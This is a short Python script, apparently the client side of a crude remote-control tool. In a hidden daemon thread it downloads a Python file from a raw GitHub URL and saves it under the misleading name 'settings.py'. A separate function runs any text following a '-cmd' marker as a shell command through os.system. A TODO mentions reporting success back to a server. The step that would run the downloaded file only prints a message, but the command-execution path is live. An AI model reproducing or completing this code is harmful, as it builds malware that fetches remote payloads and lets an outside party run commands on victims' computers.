from requests import get
from threading import Thread
from os import system
from os.path import exists

url = 'https://raw.githubusercontent.com/LifeIsACage/soc_project/main/py_to_download.py'
file_name = 'settings.py'

#TODO - Open py file and send a command succesfull message to the server

def start_downloading():
    th1=Thread(target=download_code)
    th1.daemon = True
    th1.start()

def download_code():
    data = get(url)
    dataText = data.text

    f1= open(file_name, 'w')
    f1.write(dataText)
    f1.close()

    start_code()

def start_code():
    print("Starting Code")

def run_cmd_code(cmd_data: str):
    print(cmd_data)
    try:
        cmd_data = cmd_data.split('-cmd')[1]
        print(f"Got {cmd_data}")
    except Exception as s:
        cmd_data = "msg * Hello World"
        print("Oh no error: {}".format(s))
    print("Executing command")
    system(cmd_data)